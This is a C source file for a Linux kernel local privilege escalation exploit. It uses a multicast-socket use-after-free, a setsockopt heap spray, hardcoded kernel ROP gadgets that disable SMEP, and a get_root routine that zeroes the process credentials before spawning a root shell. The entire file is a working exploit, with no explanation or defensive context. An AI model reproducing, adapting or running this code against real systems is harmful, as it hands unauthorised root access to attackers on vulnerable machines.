#include <time.h>
#include <netdb.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <net/if.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/select.h>

#define SPRAY_SIZE                             5000
#define HEAP_SPRAY                             0x000000010000000a
#define HELLO_WORLD_SERVER_PORT                8088

#define XCHG_EAX_ESP_RET                       0xFFFFFFFF817A9065
#define POP_RDI_RET                            0xFFFFFFFF8148B83D
#define MOV_DWORD_PTR_RDI_EAX_RET              0xFFFFFFFF813E7B41
#define POP_RCX_RET                            0xFFFFFFFF81AE28B3
#define MOV_CR4_RDI_RET                        0xFFFFFFFF81064750
#define JMP_RCX                                0xFFFFFFFF812D9FF1

int pid=0;
uint64_t saved_esp;
int sockfd[SPRAY_SIZE];
void *client(void *arg);

unsigned long *fake_rsp=0x817A9065;

unsigned long *pid_task     = (unsigned long*)0xFFFFFFFF810A2290;
unsigned long *find_get_pid = (unsigned long*)0xFFFFFFFF810A2340;

void get_root()
{
    asm(
        "mov    pid,%edi;"
        "callq  *find_get_pid;"
        "mov    %rax,-0x8(%rbp);"
        "mov    -0x8(%rbp),%rax;"
        "mov    $0x0,%esi;"
        "mov    %rax,%rdi;"
        "callq  *pid_task;"
        "mov    %rax,-0x10(%rbp);"
        "mov    -0x10(%rbp),%rax;"
        "mov    0xa10(%rax),%rax;"
        "mov    %rax,-0x18(%rbp);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x4,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x8,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0xc,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x10,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x14,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x18,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x1c,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x20,%rax;"
        "movl   $0x0,(%rax);"
        "nop;"
        "leaveq ;" 
        "retq   ;"
        );
}

void wrapper()
{
    asm volatile 
    ("                                         \n\
    payload:                                   \n\
        movq %%rbp, %%rax                      \n\
        movq $0xffffffff00000000, %%rdx        \n\
        andq %%rdx, %%rax                      \n\
        movq %0, %%rdx                         \n\
        addq %%rdx, %%rax                      \n\
        movq %%rax, %%rsp                      \n\
        call get_root                          \n\
        ret                                    \n\
    " : : "m"(saved_esp) : 
    );
}

void payload();

#define CHAIN_SAVE_ESP                         \
    *fake_rsp++=POP_RDI_RET;                   \
    *fake_rsp++=(uint64_t)&saved_esp;          \
    *fake_rsp++=MOV_DWORD_PTR_RDI_EAX_RET;     \

#define NEW_SMEP 0x6f0

#define CHAIN_DISABLE_SMEP                     \
    *fake_rsp++=POP_RDI_RET;                   \
    *fake_rsp++=NEW_SMEP;                      \
    *fake_rsp++=MOV_CR4_RDI_RET;

#define CHAIN_JMP_PAYLOAD                      \
    *fake_rsp++=POP_RCX_RET;                   \
    *fake_rsp++=(uint64_t)&payload;            \
    *fake_rsp++=JMP_RCX;

void spray_init() 
{
    struct group_req group;
    struct sockaddr_in *psin=NULL;
    struct sockaddr_in server_addr;

    memset(&group,0,sizeof(group));
    memset(&server_addr,0,sizeof(server_addr));

    server_addr.sin_family=AF_INET;
    server_addr.sin_addr.s_addr=htons(INADDR_ANY);
    server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);

    psin=(struct sockaddr_in *)&group.gr_group;

    psin->sin_family=AF_INET;
    psin->sin_addr.s_addr=htonl(inet_addr("10.10.2.224"));

    for(int i=0;i<SPRAY_SIZE;i++) 
    {
        if((sockfd[i]=socket(PF_INET6,SOCK_STREAM,0))<0) 
        {
           printf("spray init create socket failed!");
           return;
        }
    }
}

void heap_spray()
{
    struct ip_mreq_source mreqsrc;
    memset(&mreqsrc,0,sizeof(mreqsrc));
    mreqsrc.imr_multiaddr.s_addr=htonl(inet_addr("10.10.2.224"));

    for(int j=0;j<SPRAY_SIZE;j++)
    {
        if(setsockopt(sockfd[j],IPPROTO_IP,IP_ADD_SOURCE_MEMBERSHIP,&mreqsrc,sizeof(mreqsrc))<0)
        {
            printf("heap spray setsockopt failed!");
            return;
        }
    }
}

void *func_modify(void *arg)
{ 
    unsigned long fix_addr=0x10000000a+8*5;
    unsigned long func=XCHG_EAX_ESP_RET;
    while(1) 
    {
        *(unsigned long *)(fix_addr)=func;    
    }
}

void exploit()
{
    struct sockaddr_in server_addr;
    bzero(&server_addr,sizeof(server_addr));

    server_addr.sin_family=AF_INET;
    server_addr.sin_addr.s_addr=htons(INADDR_ANY);
    server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);

    struct group_req group={0};
    struct sockaddr_in *psin;

    psin=(struct sockaddr_in *)&group.gr_group;

    psin->sin_family=AF_INET;
    psin->sin_addr.s_addr=htonl(inet_addr("10.10.2.224"));

    int server_socket=socket(PF_INET,SOCK_STREAM,0);

    if(server_socket<0)
    {
        printf("[Server]create socket failed!");
        return;
    }

    setsockopt(server_socket,SOL_IP,MCAST_JOIN_GROUP,&group,sizeof(group));

    if(bind(server_socket,(struct sockaddr*)&server_addr,sizeof(server_addr)))
    {
        printf("[Server]server bind port:%d failed!",HELLO_WORLD_SERVER_PORT); 
        return;
    }

    if(listen(server_socket,10))
    {
        printf("[Server]server listen failed!"); 
        return;
    }

    pthread_t id_client;
    pthread_create(&id_client,NULL,client,NULL);

    spray_init();

    struct sockaddr_in client_addr;
    socklen_t length=sizeof(client_addr);

    printf("[Server]accept.....\n"); 
    int new_server_socket=accept(server_socket,(struct sockaddr*)&client_addr,&length);

    if(new_server_socket<0)
    {
        close(server_socket);
        printf("[Server]server accept failed!\n");
        return;
    }

    unsigned long fix_addr=HEAP_SPRAY&0xfffffffffffff000;
    unsigned long *addr=(unsigned long *)mmap((void*)fix_addr,1024*100,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1,0);

    if(addr==MAP_FAILED)
    {
        printf("failed to mmap!\n");
        return;
    }

    addr=(unsigned long *)HEAP_SPRAY;
    unsigned long func=(unsigned long)XCHG_EAX_ESP_RET;

    addr[0]=0x0;
    addr[1]=0x0a0a02e0;
    addr[2]=0x00000002;
    addr[3]=0x0;
    addr[4]=0x0;
    addr[5]=(unsigned long)func;

    pthread_t id_func;
    pthread_create(&id_func,NULL,func_modify,NULL);

    printf("[Server]close new_server_socket!\n");
    close(new_server_socket);
    sleep(5);

    heap_spray();

    unsigned long fake_stack_fix=0x817A9000;
    unsigned long *fake_stack_addr=(unsigned long *)mmap((void*)fake_stack_fix,1024*2048,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1,0);

    if(fake_stack_addr==MAP_FAILED)
    {
        printf("failed to mmap!\n");
        return;
    }

    memset(fake_stack_addr,0xaa,1024*2048);  

    CHAIN_SAVE_ESP;
    CHAIN_DISABLE_SMEP;
    CHAIN_JMP_PAYLOAD;

    close(server_socket);

    printf("current uid is:%d\n",getuid());
    printf("current euid is:%d\n",geteuid());

    system("/bin/sh");
}

void *client(void *arg)
{
    struct sockaddr_in client_addr;
    bzero(&client_addr,sizeof(client_addr));

    client_addr.sin_port=htons(0);
    client_addr.sin_family=AF_INET;
    client_addr.sin_addr.s_addr=htons(INADDR_ANY);

    int client_socket=socket(AF_INET,SOCK_STREAM,0);

    if(client_socket<0)
    {
        printf("[Client]create socket failed!\n");
        return;
    }

    if(bind(client_socket,(struct sockaddr*)&client_addr,sizeof(client_addr)))
    {
        printf("[Client]client bind port failed!\n");
        return;
    }

    struct sockaddr_in server_addr;
    bzero(&server_addr,sizeof(server_addr));

    server_addr.sin_family=AF_INET;

    if(inet_aton("127.0.0.1",&server_addr.sin_addr)==0)
    {
        printf("[Client]server IP address error!\n");
        return;
    }

    server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);
    socklen_t server_addr_length=sizeof(server_addr);

    if(connect(client_socket,(struct sockaddr*)&server_addr,server_addr_length)<0)
    {
        printf("[Client]cannot connect to 127.0.0.1!\n");
        return;
    }

    printf("[Client]close client socket!\n");
    close(client_socket);

    return NULL;
}

int main(int argc,char* argv[])
{
    printf("pid:%d\n",getpid());
    pid=getpid();
    exploit();
    return 0;
}